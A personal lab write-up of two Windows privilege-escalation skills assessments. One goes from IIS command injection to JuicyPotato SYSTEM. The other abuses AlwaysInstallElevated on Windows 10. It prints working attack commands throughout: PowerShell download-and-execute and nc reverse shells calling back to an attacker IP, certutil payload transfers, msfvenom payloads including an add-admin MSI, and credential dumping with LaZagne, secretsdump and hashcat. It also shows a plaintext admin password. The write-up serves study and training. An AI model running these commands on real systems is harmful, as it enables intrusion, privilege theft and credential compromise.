MORAL OF THE LEARNING: When you find a vulnerable or EOL system, do not simply tell the client to remove or upgrade it. First, understand what the issue is, why it matters, how it affects their environment, and what risks it creates. Communicate with the client to understand their business needs, technical limitations, and financial ability to upgrade or remove the system, then recommend realistic remediation or temporary mitigations based on their situation.

---
---

#  Windows Privilege Escalation Skills Assessment 1

IIS web server, command-injection foothold as the web user, then privesc to SYSTEM. This one fought me HARD — every potato failed before I found the trick. Writing down every dead end so next time is 5 minutes, not 5 hours.

## The box

- Windows **Server 2016 Standard**, build **14393 (1607)**, **standalone** (WORKGROUP, not domain-joined).
- Only 2 patches: KB3199986, KB3200970.
- Ports: **80 (HTTP)** and **3389 (RDP)**.
- I land as **IIS APPPOOL\DefaultAppPool** with **SeImpersonatePrivilege** (enabled) → screams "potato attack."

## Step 1 — Foothold (command injection)

after doing nmap, The web page is a "ping" box. It just appends my input to a `ping` command, so I inject with `&`:

```
127.0.0.1 & whoami
```
Worked → command injection confirmed. Then a PowerShell reverse shell (hosted `rev.ps1` on my HTTP server, caught it on my listener):
```
127.0.0.1 & powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.66:5555/rev.ps1')
```
Checked privileges → **SeImpersonatePrivilege Enabled**. Good sign.

## Step 2 — Into Metasploit (smb_delivery)

To work easier, I got an msf session with `smb_delivery`. Problems I hit:

- `EACCES bind 445` → port 445 needs root → run `sudo msfconsole`.
- One-liner showed `\\0.0.0.0\...` → I set LHOST but not **SRVHOST** (the UNC path uses SRVHOST) → `set SRVHOST 10.10.14.66`.
- Ports stuck (`BindFailed`) → `jobs -K`, or full reset: `exit`, `sudo pkill -9 -f ruby`, `sudo fuser -k 445/tcp 4444/tcp`.

Got **session 1**.

## Step 3 — tried msf's automatic exploits (and why I gave up on them)

I let Metasploit suggest + run exploits for me first:

```
use post/multi/recon/local_exploit_suggester

set SESSION 1

run
```
Got a big list. Tried `ms16_075_reflection_juicy` and `cve_2020_1337_printerdemon` → **"Payload arch must match target arch."**

My session was 32-bit, so I migrated to a 64-bit process:
```
migrate 3092        (w3wp, x64)
```

**Arch lesson:** migrating fixes my **shell's** arch, NOT the **payload's**. The error was about the payload → I set a 64-bit payload too:
```
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

But every run gave: **"Exploit completed, but no session created"** — even though it said "injected" fine. That means the exploit worked but the **payload never called back** → **AV (Defender) was killing the meterpreter payload.** Changing ports/x86/x64 didn't help.

### >> The turning point: stop auto-exploiting, go manual

So I **stopped using the msf CVE modules** (they kept getting AV'd) and **went back to a plain shell on the target** to **enumerate and run the privesc tools by hand.** This is the big habit: when Metasploit's auto-exploits keep failing (usually AV eating the payload), drop back to your own foothold shell and do it manually with standalone tools + a plain nc shell.

## Step 4 — manual enumeration + every potato failed (the map)

Now working from my own shell on the box.

First, where can I write? `icacls C:\Windows\Temp` = denied, but **C:\Users\Public** was writable (SERVICE has WD/AD). SMB copy failed, so I transferred tools over HTTP instead:
```cmd
certutil -urlcache -f http://10.10.14.66:8080/ps.exe C:\Users\Public\ps.exe
```

Since I have **SeImpersonate**, the plan is a **potato → SYSTEM**. I tried every one by hand, and they ALL failed — each for a different reason:

| Potato | Trigger it uses | What happened |
|--------|-----------------|---------------|
| PrintSpoofer | Spooler named pipe (over SMB/445) | `Operation failed or timed out` |
| GodPotato / JuicyPotato / JuicyPotatoNG | DCOM / OXID | `0x80070776` / "failed to communicate with COM server" |
| EfsPotato | EFS RPC named pipe | `1722` (RPC server unavailable) on every pipe |

Even compiling EfsPotato **on the target** (no binary needed):

```cmd
certutil -urlcache -f http://10.10.14.66:8080/EfsPotato.cs C:\Users\Public\EfsPotato.cs

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:C:\Users\Public\efs.exe C:\Users\Public\EfsPotato.cs

C:\Users\Public\efs.exe "whoami" efsrpc     (also tried samr, lsass, netlogon — all 1722)
```

**Why they all died:** this box blocks **port 445 even on loopback** (my SMB to the attack box failed too) which kills the named-pipe potatoes, AND a host firewall eats the DCOM callbacks. The Spooler was actually RUNNING (`sc query spooler` = RUNNING), but it still timed out because its callback goes over 445.

Other dead ends:
- **LaZagne** as the IIS user → `0 passwords found` (it can only read its own user's creds).
- **Snaffler** (`.\sn.exe -s -i C:\`) → one RED "hit" that was a **false positive** (its regex matched `-Passthru`, not a password, in a default Windows App-V script).
- **WinPEAS / SharpUp** → nothing useful (SharpUp only saw SeImpersonate).

## Step 5 — THE WIN: JuicyPotato with a MANUAL CLSID

The trick the module never tells you: JuicyPotato's **default CLSID doesn't work** on this box. You have to **pull a working CLSID from the target yourself**:
```cmd
reg query HKCR\CLSID /s /f LocalService
```
This gave the **winmgmt** CLSIDs:
```
{8BC3F05E-D86B-11D0-A075-00C04FB68820}
{C49E32C6-BC8B-11d2-85D4-00105A1F8304}
```

Then standalone JuicyPotato + an **nc reverse shell** (not meterpreter — beats AV):
```cmd
certutil -urlcache -f http://10.10.14.66:8080/nc64.exe C:\Users\Public\nc64.exe
```
Start `nc -lvnp 5555` on the attack box, then:
```cmd
.\j.exe -l 5555 -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}" -p c:\windows\system32\cmd.exe -a " /c c:\users\public\nc64.exe 10.10.14.66 5555 -e cmd" -t *
```
→ `authresult 0` → **NT AUTHORITY\SYSTEM** shell caught. FINALLY. 🎉

## Step 6 — Loot as SYSTEM

**ldapadmin password** — re-run LaZagne, now as SYSTEM (this time it reads ALL users' creds):
```cmd
C:\Users\Public\l.exe all
```


**Admin flag:**
```cmd
type C:\Users\Administrator\Desktop\flag.txt
```


**confidential.txt:**
```cmd
where /r C:\Users confidential.txt

```


## Key lessons (the gold — don't forget these)

- **JuicyPotato: get the CLSID from the target** with `reg query HKCR\CLSID /s /f LocalService` (look for winmgmt). The module's default CLSID often doesn't work.
- **LaZagne: run it AS SYSTEM, not before.** As a low-priv user it finds nothing; as SYSTEM it reads every user's stored creds.
- **Each potato uses a different trigger** (PrintSpoofer = Spooler pipe, Juicy/God = DCOM, Efs = EFS RPC). If one's blocked, test the others — but a locked-down box can block all three.
- **"no session created" with injection working = AV killing the payload.** Drop meterpreter for a plain nc shell.
- **migrate = shell arch; payload arch is separate** (set the payload arch yourself).
- **Snaffler/WinPEAS can mislead** — Snaffler's `-password` regex false-matched `-Passthru`. Always read the actual file.
- You can **compile a C# potato on the target** with `csc.exe` when you can't find a binary.

## WHY potatoes work, and why they failed here (the part I finally got)

**SeImpersonate in plain words:** "anything that runs as SYSTEM and logs in / connects to me, I'm allowed to steal its token and become it."

**So every potato = 3 moves:**

1. Set a trap (open a doorway I control).

2. Trick a SYSTEM service into walking through my doorway (connect/authenticate to me).

3. The moment it does → grab its SYSTEM token → I'm SYSTEM.

The ONLY difference between potatoes = which SYSTEM service they lure, and what kind of doorway they use.

**Key words:**

- **Named pipe** = a private channel two programs use to talk, with a name (like `\\.\pipe\spoolss`). It's the "doorway." When a SYSTEM program connects to my pipe, I grab its token.

- **Print Spooler / spooling** = a Windows service that runs as SYSTEM and queues print jobs. It's just a SYSTEM program I can trick. PrintSpoofer tells it "come knock on my pipe," it does (as SYSTEM), I steal its token.

- **CLSID** = the "street address" of a specific SYSTEM COM/DCOM service. Potatoes like JuicyPotato lure a COM service by its CLSID.

- **RPC** = a way to "phone" a service and ask it to do something (EfsPotato phones the EFS service).

**Why each failed on this box:**

- **PrintSpoofer** → the Spooler's knock travels over **SMB (port 445)**, even locally. This box blocks 445 even to itself → the Spooler couldn't reach my pipe → timed out. (Spooler WAS running; the road was closed.)

- **GodPotato / JuicyPotato / JuicyPotatoNG** → these guess a built-in **CLSID**. On this box their guessed address pointed to a service that doesn't exist/open → nobody came to the trap → `0x80070776` ("object exporter not found" = address doesn't resolve). NOT the firewall — wrong address.

- **EfsPotato** → phoned the EFS service over RPC → `1722` (RPC server unavailable) = nobody picked up. That service wasn't answering here.

**Why the WIN worked:** instead of guessing the CLSID, I pulled a REAL one from the box itself (`reg query HKCR\CLSID /s /f LocalService` → winmgmt). That address actually has a SYSTEM service home, so when JuicyPotato lured it, a real SYSTEM service walked to my trap → token stolen → SYSTEM. The DCOM doorway worked all along; the earlier tools just knocked on empty addresses.

One-picture summary:

```
PrintSpoofer  → lure Spooler, door = pipe over 445   → 445 closed → nobody arrives

EfsPotato     → lure EFS service over RPC            → RPC dead (1722) → no call

God/Juicy     → lure COM service by CLSID            → wrong CLSID = empty address → nobody home

WINNING Juicy → same COM door, REAL CLSID (winmgmt)  → real SYSTEM service arrives → token stolen
```

---
---

# Windows Privilege Escalation Skills Assessment 2 

Windows 10 Pro, build 18363 (1909). Shell as low-priv htb-student → privesc to SYSTEM. The clean win was AlwaysInstallElevated, after a lot of CVE/potato detours that didn't pan out.

## The box

- Windows 10 Pro, version 1909, build 18363, x64.
- I land as a low-priv user (htb-student).

Transfer tool I used throughout (HTTP, since SMB gets blocked on Win10):

```cmd
certutil -urlcache -f http://10.10.14.66:4444/win.exe C:\Users\Public\win.exe
```

## Step 1 — Enumerate with WinPEAS

Ran WinPEAS and found 3 interesting things:

- Creds: **iamtheadministrator** / `Inl@n3fr3ight_sup3rAdm1n!` — but I **couldn't log in** with them (RDP failed, see lesson below).
- **AlwaysInstallElevated = 1** (the eventual winner).
- Unquoted service paths like `C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr` and `C:\Program Files\Internet Explorer\iexplore.exe %1`.

Important: those unquoted paths are **NOT exploitable** — they live in `C:\Program Files`, which I **can't write to**. An unquoted path is only exploitable if I can write into one of its folders (like `C:\` or `C:\Program`). So I ignored them. I PERPOSELY DID THE "AlwaysInstallElevated" at the end because i wanted to try out the CVE exploits, you can do it at your first. and skip to step 4 from here.

## Step 2 — WES-NG for kernel CVEs

Saved `systeminfo` to a file and ran WES-NG, filtered to only privesc with public exploits:

```bash

python3 wes.py systeminfo.txt -i "Elevation of Privilege" --exploits-only
```

That cut ~70 CVEs down to the real options:

- CVE-2020-0796 — SMBv3 "SMBGhost" (has a public LPE exploit, exploit-db 48267)
- CVE-2020-1048 — PrintDemon (Print Spooler EoP)
- CVE-2020-1054 — Win32k EoP

## Step 3 — the detours that DIDN'T work

**msf via smb_delivery → failed.** Tried to get a meterpreter session with smb_delivery,  and try the exploits, but:

- It jammed because **Responder was running on port 445** (both responder and smb_delivery want 445 — only one can have it). `sudo ss -ltnp | grep :445` tried and stopped  the running services on the port but again idk why it was running.
- Even after that, Win10 **blocks anonymous/guest SMB access** by default, so the target refused to load the DLL ("unauthenticated guest access blocked").

**msfvenom exe + certutil → tiring.** Switched to a meterpreter exe over HTTP:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.66 LPORT=6655 -f exe -o shell.exe
```

```cmd
certutil -urlcache -f http://10.10.14.66:4444/shell.exe C:\Users\Public\shell.exe
```

Callbacks kept dying (AV). Tiring process.

**CVE-2020-0796 LPE → failed.** Grabbed the compiled LPE exe:

```cmd
certutil -urlcache -f http://10.10.14.66:4444/cve-2020-0796-local.exe C:\Users\Public\smb.exe
```

It got far (found the kernel token, changed SEP_TOKEN_PRIVILEGES) but failed at the last step: "Injecting shellcode in winlogon... Could not open process." SMBGhost LPE is **racy** — a half-success corrupts the kernel so retries fail; it needs a fresh boot and often still flops. Gave up on it.

## Step 4 — THE WIN: AlwaysInstallElevated

AlwaysInstallElevated = 1 means **any MSI runs as SYSTEM.** The smart move: make the MSI **add an admin user** instead of a reverse shell — **no callback**, so AV/connection issues don't matter.

Build the MSI (note the `cmd.exe /c` — see lesson):

```bash
msfvenom -p windows/x64/exec CMD='cmd.exe /c net user pwn Pwn123! /add && net localgroup administrators pwn /add' -f msi -o evil.msi
```

Transfer + run it on the target:

```cmd
certutil -urlcache -f http://10.10.14.66:4444/evil.msi C:\Users\Public\evil.msi
```

```cmd
msiexec /quiet /qn /i C:\Users\Public\evil.msi
```

Check it worked:

```cmd
net localgroup administrators
```

`pwn` is now a local admin. Voila!

## Step 5 — admin → SYSTEM + loot

Log in as the new admin to get a SYSTEM shell (psexec, no UAC hassle):

```bash
impacket-psexec pwn:'Pwn123!'@10.129.43.33
```

Dump every local user's NTLM hash:

```bash
impacket-secretsdump pwn:'Pwn123!'@10.129.43.33
```

Then crack the one I needed (SAM NTLM hash = mode **1000**, give just the NT hash):

```bash
hashcat -m 1000 <NT_hash> /usr/share/wordlists/rockyou*.txt
```

## Key lessons (the gold)

- **AlwaysInstallElevated (both keys `0x1`) = any MSI runs as SYSTEM.** Use an **add-admin-user MSI** (no callback) to dodge AV completely — way cleaner than a reverse shell. Try it first. I left it for later use lol.
- **The `&` bug:** `windows/exec` runs the command with no shell, so `&` / `&&` aren't understood → wrap the whole thing in **`cmd.exe /c`**. Without it, only the first command runs (my user got created but never added to admins).
- **Unquoted paths in `C:\Program Files` are dead ends** — only exploitable if you can write into one of the path's folders.
- **smb_delivery fails on Win10** — anonymous SMB guest access is blocked by default, and Responder fights it for port 445. Use **HTTP (certutil) delivery** instead.
- **SMBGhost LPE is racy** — "Could not open process" at the winlogon step is a known flaky failure; needs a fresh boot and often still fails. Not worth the pain when there's a cleaner path.
- **Hash modes:** SAM NTLM hash (from secretsdump) = **`-m 1000`**. NetNTLMv2 (from Responder capture) = `-m 5600`. They look alike but are different — don't mix them up.
- You can **pass-the-hash** instead of cracking: `impacket-psexec user@ip -hashes <LM>:<NT>`.
- **WES-NG filter:** `-i "Elevation of Privilege" --exploits-only` turns a huge list into the 2-3 that matter.
- RDP failing (`LOGON_FAILURE`) doesn't always mean bad creds — verify with `nxc smb <ip> -u user -p 'pass'` before trusting it; the account may just not be allowed RDP.

